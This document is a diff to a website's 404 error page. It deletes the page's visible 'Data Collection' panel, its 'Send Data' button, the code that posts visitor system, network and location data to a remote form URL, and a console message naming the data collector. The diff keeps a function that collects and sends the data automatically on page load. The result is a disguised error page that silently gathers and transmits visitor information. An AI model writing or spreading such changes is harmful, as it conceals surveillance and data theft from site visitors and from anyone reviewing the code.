@@ -212,190 +212,6 @@
             font-size: 0.9rem;
         }
 
-        /* Hidden debug panel */
-        .debug-panel {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            cursor: pointer;
-            font-size: 0.8rem;
-            z-index: 1000;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-            transition: all 0.3s;
-        }
-
-        .debug-panel:hover {
-            background: #1669d6;
-            transform: scale(1.1);
-        }
-
-        .debug-content {
-            display: none;
-            position: fixed;
-            bottom: 80px;
-            right: 20px;
-            background: white;
-            border: 1px solid #e1e5e9;
-            border-radius: 8px;
-            padding: 1.5rem;
-            width: 400px;
-            max-width: 90vw;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-            z-index: 1000;
-        }
-
-        .debug-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 1rem;
-            padding-bottom: 0.5rem;
-            border-bottom: 1px solid #e1e5e9;
-        }
-
-        .debug-title {
-            font-weight: 600;
-            color: #3c4043;
-        }
-
-        .close-debug {
-            background: none;
-            border: none;
-            font-size: 1.2rem;
-            cursor: pointer;
-            color: #5f6368;
-        }
-
-        .debug-section {
-            margin-bottom: 1rem;
-        }
-
-        .debug-section h4 {
-            color: #3c4043;
-            margin-bottom: 0.5rem;
-            font-size: 0.9rem;
-        }
-
-        .debug-info {
-            background: #f8f9fa;
-            padding: 0.75rem;
-            border-radius: 4px;
-            font-family: monospace;
-            font-size: 0.8rem;
-            color: #5f6368;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-
-        .debug-actions {
-            display: flex;
-            gap: 0.5rem;
-        }
-
-        .debug-btn {
-            padding: 0.5rem 1rem;
-            border: none;
-            border-radius: 4px;
-            font-size: 0.8rem;
-            cursor: pointer;
-            flex: 1;
-        }
-
-        .debug-btn.primary {
-            background: #1a73e8;
-            color: white;
-        }
-
-        .debug-btn.secondary {
-            background: #f8f9fa;
-            color: #3c4043;
-            border: 1px solid #dadce0;
-        }
-
-        .tab-container {
-            display: flex;
-            border-bottom: 1px solid #e1e5e9;
-            margin-bottom: 1rem;
-        }
-
-        .tab {
-            padding: 0.5rem 1rem;
-            cursor: pointer;
-            border-bottom: 2px solid transparent;
-            font-size: 0.9rem;
-        }
-
-        .tab.active {
-            border-bottom-color: #1a73e8;
-            color: #1a73e8;
-            font-weight: 500;
-        }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        .data-item {
-            margin-bottom: 0.5rem;
-            padding: 0.25rem 0;
-        }
-
-        .data-item strong {
-            color: #3c4043;
-        }
-
-        .sensitive-data {
-            background-color: #fff8e1;
-            padding: 0.5rem;
-            border-radius: 4px;
-            border-left: 3px solid #ffc107;
-        }
-
-        .status {
-            padding: 0.75rem;
-            border-radius: 4px;
-            margin-bottom: 1rem;
-            font-size: 0.9rem;
-        }
-
-        .status.loading {
-            background-color: #e3f2fd;
-            color: #0d47a1;
-            border-left: 3px solid #2196f3;
-        }
-
-        .status.success {
-            background-color: #e8f5e9;
-            color: #1b5e20;
-            border-left: 3px solid #4caf50;
-        }
-
-        .status.error {
-            background-color: #ffebee;
-            color: #b71c1c;
-            border-left: 3px solid #f44336;
-        }
-
-        .auto-collect-notice {
-            background-color: #e3f2fd;
-            border: 1px solid #bbdefb;
-            border-radius: 4px;
-            padding: 0.75rem;
-            margin-bottom: 1rem;
-            font-size: 0.9rem;
-            color: #0d47a1;
-        }
-
         @media (max-width: 768px) {
             .nav-container {
                 flex-direction: column;
@@ -422,11 +238,6 @@
                 flex-direction: column;
                 text-align: center;
             }
-
-            .debug-content {
-                width: 90vw;
-                right: 5vw;
-            }
         }
     </style>
 </head>
@@ -434,7 +245,7 @@
     <!-- Header -->
     <header class="header">
         <nav class="nav-container">
-            <a href="/" class="logo">WebsiteName</a>
+            <a href="/" class="logo">Fun Webiste Error</a>
             <div class="nav-links">
                 <a href="/">Home</a>
                 <a href="/about">About</a>
@@ -488,60 +299,6 @@
             </div>
         </div>
     </footer>
-
-    <!-- Debug Panel -->
-    <button class="debug-panel" onclick="toggleDataPanel()">Data</button>
-    
-    <div class="debug-content" id="dataPanel">
-        <div class="debug-header">
-            <div class="debug-title">Data Collection</div>
-            <button class="close-debug" onclick="toggleDataPanel()">×</button>
-        </div>
-        
-        <div class="auto-collect-notice">
-            Data collection is automatically triggered when the page loads.
-        </div>
-        
-        <div class="tab-container">
-            <div class="tab active" onclick="switchTab('basic')">Basic</div>
-            <div class="tab" onclick="switchTab('network')">Network</div>
-            <div class="tab" onclick="switchTab('advanced')">Advanced</div>
-        </div>
-        
-        <div class="tab-content active" id="basicTab">
-            <div class="debug-section">
-                <h4>Basic System Information</h4>
-                <div class="debug-info" id="basicDataPreview">
-                    Loading basic data...
-                </div>
-            </div>
-        </div>
-        
-        <div class="tab-content" id="networkTab">
-            <div class="debug-section">
-                <h4>Network Information</h4>
-                <div class="debug-info" id="networkDataPreview">
-                    Click to load network data
-                </div>
-            </div>
-        </div>
-        
-        <div class="tab-content" id="advancedTab">
-            <div class="debug-section">
-                <h4>Advanced System Information</h4>
-                <div class="debug-info" id="advancedDataPreview">
-                    Loading advanced data...
-                </div>
-            </div>
-        </div>
-        
-        <div id="status" style="display: none;"></div>
-        
-        <div class="debug-actions">
-            <button class="debug-btn primary" onclick="collectAndSendToForm()">Send Data</button>
-            <button class="debug-btn secondary" onclick="toggleDataPanel()">Close</button>
-        </div>
-    </div>
 
     <script>
         // Configuration
@@ -975,98 +732,6 @@
         function testIndexedDB() {
             return !!window.indexedDB;
         }
-
-        // UI Functions
-        function toggleDataPanel() {
-            const panel = document.getElementById('dataPanel');
-            if (panel.style.display === 'block') {
-                panel.style.display = 'none';
-            } else {
-                panel.style.display = 'block';
-                switchTab('basic');
-            }
-        }
-        
-        function switchTab(tabName) {
-            // Update tabs
-            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
-            
-            event.target.classList.add('active');
-            document.getElementById(tabName + 'Tab').classList.add('active');
-            
-            // Load data for the tab
-            if (tabName === 'basic') showBasicData();
-            else if (tabName === 'network') showNetworkData();
-            else if (tabName === 'advanced') showAdvancedData();
-        }
-        
-        async function showBasicData() {
-            const data = collectBasicData();
-            const container = document.getElementById('basicDataPreview');
-            container.innerHTML = formatDataForDisplay(data);
-        }
-        
-        async function showNetworkData() {
-            const container = document.getElementById('networkDataPreview');
-            container.innerHTML = '<div class="data-item">Fetching network data...</div>';
-            
-            const data = await collectNetworkData();
-            container.innerHTML = formatDataForDisplay(data, true);
-        }
-        
-        async function showAdvancedData() {
-            const data = collectAdvancedData();
-            const container = document.getElementById('advancedDataPreview');
-            container.innerHTML = formatDataForDisplay(data);
-        }
-        
-        function formatDataForDisplay(data, isSensitive = false) {
-            let html = '';
-            for (const [key, value] of Object.entries(data)) {
-                const sensitiveClass = (key.includes('ip') || key.includes('location') || key.includes('address')) ? 'sensitive-data' : '';
-                
-                if (typeof value === 'object') {
-                    html += `<div class="data-item ${sensitiveClass}"><strong>${key}:</strong> ${JSON.stringify(value, null, 2)}</div>`;
-                } else {
-                    html += `<div class="data-item ${sensitiveClass}"><strong>${key}:</strong> ${value}</div>`;
-                }
-            }
-            return html;
-        }
-        
-        async function collectAndSendToForm() {
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerHTML = '<div class="status loading">Collecting comprehensive system data...</div>';
-            statusDiv.style.display = 'block';
-
-            try {
-                const data = await collectAllData();
-                
-                // Prepare data for form
-                const formData = new FormData();
-                const dataString = JSON.stringify(data, null, 2);
-                
-                formData.append(FORM_FIELD_ID, dataString);
-
-                statusDiv.innerHTML = '<div class="status loading">Sending data to server...</div>';
-
-                // Send data to form
-                await fetch(FORM_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: formData
-                });
-
-                statusDiv.innerHTML = '<div class="status success">All data successfully sent to server!</div>';
-                
-                console.log('Complete data sent:', data);
-
-            } catch (error) {
-                console.error('Error:', error);
-                statusDiv.innerHTML = `<div class="status error">Error: ${error.message}</div>`;
-            }
-        }
         
         // NEW: Auto-trigger function
         async function autoCollectAndSend() {
@@ -1096,7 +761,7 @@
         }
         
         function goHome() {
-            window.location.href = '/';
+            window.history.back();
         }
         
         function goBack() {
@@ -1105,7 +770,6 @@
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('Enhanced 404 page with data collector initialized');
             
             // Auto-trigger data collection when page loads
             autoCollectAndSend();
